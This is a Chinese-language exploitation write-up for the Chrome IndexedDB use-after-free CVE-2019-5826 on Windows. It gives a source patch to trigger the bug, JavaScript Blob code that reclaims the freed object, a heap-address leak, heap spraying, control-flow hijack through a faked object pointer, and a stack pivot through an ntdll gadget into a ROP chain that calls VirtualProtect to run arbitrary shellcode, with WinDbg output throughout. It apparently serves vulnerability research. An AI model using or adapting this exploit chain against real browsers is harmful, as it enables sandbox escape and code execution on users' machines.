# cve-2019-5826 利用

漏洞成因，kp已经分析过了，这里略去不说，从uaf构建后开始利用

环境:windows

## 利用流程
### 构造uaf

构造uaf需要renderer rce，因此选择直接patch chrome源码

```diff
void WebIDBFactoryImpl::Open( 
       std::make_unique<IndexedDBDatabaseCallbacksImpl>( 
           base::WrapUnique(database_callbacks)); 
   DCHECK(!name.IsNull()); 
   factory_->Open(GetCallbacksProxy(std::move(callbacks_impl)), 
                  GetDatabaseCallbacksProxy(std::move(database_callbacks_impl)), 
                  name, version, transaction_id); 
+  if (version == 3) { 
+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info; 
+    auto request = mojo::MakeRequest(&ptr_info); 
+    factory_->DeleteDatabase(std::move(ptr_info), name, true); 
+    factory_->AbortTransactionsForDatabase( base::OnceCallback<void(blink::mojom::IDBStatus)>()); 
+  } 
 } 
```

### 将free掉的DB申请回来

首先确定 indexedDBDatabase 结构体的大小，通过在content::indexedDBDatabase::DeleteDatabase 添加

```
LOG(ERROR) << sizeof(indexedDBDatabase);
```

可以得到结构体大小为 0x150

得知结构体大小后，在js中使用 new blob 即可申请到uaf的内存

```js
let ab = new ArrayBuffer(0x150); //indexedDBDatabase的size
var uaf_ta = new BigUint64Array(ab);
uaf_ta[0] = 0x12345679n;  //just a sig
for(let j=1;j<35;j++){
    uaf_ta[j]=0x101n;   //将active_request_置非0
}
uaf_ta[36] = 0x101n;
for(let i = 0; i < 0x5000; i++){
var a=new Blob([ab]);
    blob_list.push(a);  //存放blob
}

```

其中 uaf_ta[j]=0x101n; 是将fake_indexedDBDatabase中的active_request_置为非0，从而绕过如下判断
```c++
void IndexedDBDatabase::AppendRequest(
    std::unique_ptr<ConnectionRequest> request) {
  pending_requests_.push(std::move(request));

  if (!active_request_)
  //该函数会触发遍历fake_indexedDBDatabase结构体中的一个std::map，而此时我们还没有堆地址，因此不能进入此函数
    ProcessRequestQueue(); 
}
```

此时，再调用一次 window.indexedDB.deleteDatabase 即可发现rcx寄存器，即函数调用第一个参数所指向的内容已经变成了我们控制的sig 0x12345679

```
0:006> r
rax=00004d3c96917aaf rbx=000001f3ad825f60 rcx=000001f3ad8e2180
rdx=00000055007fee70 rsi=000001f3ad8e2180 rdi=00000055007fef30
rip=00007ffc122fa896 rsp=00000055007fed68 rbp=00000055007fef90
 r8=0000000000000000  r9=0000000000000003 r10=0000000000000003
r11=0000000000000003 r12=00000055007ff038 r13=000001f3b22afde0
r14=00000055007fee78 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
chrome!content::IndexedDBDatabase::DeleteDatabase:
00007ffc`122fa896 56              push    rsi

0:006> dq 000001f3ad8e2180
000001f3`ad8e2180  00000000`12345679 00000000`00000101
000001f3`ad8e2190  00000000`00000101 00000000`00000101
000001f3`ad8e21a0  00000000`00000101 00000000`00000101
000001f3`ad8e21b0  00000000`00000101 00000000`00000101
000001f3`ad8e21c0  00000000`00000101 00000000`00000101
000001f3`ad8e21d0  00000000`00000101 00000000`00000101
000001f3`ad8e21e0  00000000`00000101 00000000`00000101
000001f3`ad8e21f0  00000000`00000101 00000000`00000101
...
```

### 泄露堆地址

第二次执行 window.indexedDB.deleteDatabase 后，我们可以通过调试发现fake_indexedDBDatabase结构体中多出了一个堆指针

```
000001f3`ad8e2180  00000000`12345679 00000000`00000102
000001f3`ad8e2190  00000000`00000101 00000000`00000101
000001f3`ad8e21a0  00000000`00000101 00000000`00000101
000001f3`ad8e21b0  00000000`00000101 00000000`00000101
000001f3`ad8e21c0  00000000`00000101 00000000`00000101
000001f3`ad8e21d0  00000000`00000101 00000000`00000101
000001f3`ad8e21e0  00000000`00000101 00000000`00000101
000001f3`ad8e21f0  00000000`00000101 00000000`00000101
000001f3`ad8e2200  00000000`00000101 00000000`00000101
000001f3`ad8e2210  00000000`00000101 00000000`00000101
000001f3`ad8e2220  00000000`00000101 00000000`00000101
000001f3`ad8e2230  00000000`00000101 00000000`00000101
000001f3`ad8e2240  00000000`00000101 00000000`00000101
000001f3`ad8e2250  00000000`00000101 00000000`00000101
000001f3`ad8e2260  00000000`00000101 00000000`00000101
000001f3`ad8e2270  00000000`00000101 00000000`00000101
000001f3`ad8e2280  00000000`00000101 00000000`00000101
000001f3`ad8e2290  00000000`00000101 00000000`00000000
000001f3`ad8e22a0  00000000`00000101 000001f3`c2dcee00 //多出的heap addr
```

因此我们只需要读取blob_list中刚刚申请的所有块中该偏移处的值，非0x101即为堆地址


### 重新申请uaf的块

blob的值无法在申请后更改，因此我们需要将原来申请到的blob释放掉

我想到的方法是将页面跳转到第二个exp中，此时原页面js在浏览器进程中的内存将被释放。

切换到新exp页面后即可再次申请0x150的块进行攻击

泄露的堆地址通过 '#' 标签在url中传给下一个页面

### 堆喷

泄露出的堆地址并不准确，无法直接使用，因此我们对其进行如下处理：

```
var tmp=(heap_addr+0x20000000n)&(~0xfffn); 
```

将尾部置零并加上一个很大的数值。

这时我们再多次申请较大 size 且size大小尾部也为0的 blob 如 0x1000*0x800 ， 这样申请到的内存块有很大概率包含着刚刚通过运算得到的tmp地址。然后我们在申请到的blob中每隔0x1000就放置提前构造好的内容。

这样，只要申请的大blob块中包含了tmp所指的地址，即可保证能覆写准确。

### 控制流劫持

在 dodelete 函数中会调用 fake_indexedDBDatabase 中+8处的指针

```
0:039> u 00007ffc`12300910-1
chrome!content::IndexedDBDatabase::DeleteRequest::DoDelete+0x43:
00007ffc`1230090f ff5008          call    qword ptr [rax+8]
00007ffc`12300912 488b3f          mov     rdi,qword ptr [rdi]
00007ffc`12300915 4885ff          test    rdi,rdi
00007ffc`12300918 0f84bb000000    je      chrome!content::IndexedDBDatabase::DeleteRequest::DoDelete+0x10d (00007ffc`123009d9)
00007ffc`1230091e 4c8d05c3436a02  lea     r8,[chrome!`string' (00007ffc`149a4ce8)]
00007ffc`12300925 488d9c2480000000 lea     rbx,[rsp+80h]
00007ffc`1230092d 4889d9          mov     rcx,rbx
00007ffc`12300930 66ba1c00        mov     dx,1Ch
0:039> r
rax=000002c8cbeb4000 rbx=000002c8a6d5f350 rcx=000002c8cbeb4000
rdx=000000ef5fffede0 rsi=000002c8a6db2ff0 rdi=000000ef5fffede0
rip=00007ffca1552ae8 rsp=000000ef5fffedb8 rbp=0000000000000000
 r8=000002c8a6d5f248  r9=000000ef5fffee60 r10=0000000000000080
r11=8001f0d2f8900ee4 r12=000000ef5ffff258 r13=000002c8ac0eae80
r14=000000ef5ffff098 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
ntdll!_longjmp_internal+0x98:
00007ffc`a1552ae8 488b5150        mov     rdx,qword ptr [rcx+50h] ds:000002c8`cbeb4050=00007ffca15500de
0:039> d 000002c8cbeb4000
000002c8`cbeb4000  000002c8`cbeb4000 00007ffc`a1552ae8
000002c8`cbeb4010  000002c8`cbeb4100 00000000`00000000
000002c8`cbeb4020  00000000`00000000 00000000`00000000
000002c8`cbeb4030  00000000`00000000 00000000`00000000
000002c8`cbeb4040  000002c8`cbeb4000 00000000`00000000
000002c8`cbeb4050  00007ffc`a15500de 00000000`00000000
000002c8`cbeb4060  00000000`00000000 00000000`00000000
000002c8`cbeb4070  00000000`00000000 00000000`00000000

```

因此，只需控制fake_indexedDBDatabase+8处的值即可劫持控制流

### 执行任意shellcode

windows下各个进程加载的模块地址是相同的，因此在renderer rce的情况下我们可以泄露出ntdll等一系列dll的基地址，很容易即可实现栈劫持后rop

使用ntdll中此gadget，此时rcx值仍然为 fake_indexedDBDatabase 可以劫持rsp的值，并持续控制执行流
```
ntdll!_longjmp_internal+0x98:
00007ffc`a1552ae8 488b5150        mov     rdx,qword ptr [rcx+50h]
00007ffc`a1552aec 488b6918        mov     rbp,qword ptr [rcx+18h]
00007ffc`a1552af0 488b6110        mov     rsp,qword ptr [rcx+10h]
00007ffc`a1552af4 ffe2            jmp     rdx
```

然后使用rop调用VirtualProtect将fake_indexedDBDatabase处的内存改为可读可写可执行，再跳转到fake_indexedDBDatabase+0x300(任意稍远处)，即可执行任意shellcode

## 调试

在windows下使用windbg进行调试

仅使用了以下命令
```
u:反汇编内存
x:查找函数名对应的地址
r:查看当前寄存器状态
d:查看当前内存
```


